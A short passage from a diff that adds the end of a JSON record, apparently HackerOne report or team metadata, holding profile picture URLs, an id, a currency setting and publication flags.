+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/001/382/1e9872bf9cfe04008c2673e07bfecaa83858cca1_small.jpg?1532728703", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 1382, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
